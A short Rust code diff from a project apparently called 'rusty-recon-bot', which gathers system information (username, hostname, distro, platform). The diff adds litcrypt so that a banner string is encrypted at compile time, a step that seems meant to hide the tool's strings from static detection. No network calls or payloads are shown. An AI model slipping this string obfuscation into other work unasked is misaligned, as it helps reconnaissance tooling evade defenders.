@@ -5,10 +5,12 @@ extern crate litcrypt;
 
 use whoami::{distro, username, platform, hostname};
 
+// To use litcrypt, set the Litcrypt env variable from the terminal:
+// husky@dev-kde:~/rusty-recon-bot$ export LITCRYPT_ENCRYPT_KEY="RustyReconBot"
 use_litcrypt!();
 
 fn collect_info() -> String {
-    let mut return_string: String = "================= SYSINFO =================".to_string();
+    let mut return_string: String = lc!("================= SYSINFO =================");
 
     let session_username: String = username();
     let session_hostname: String = hostname();
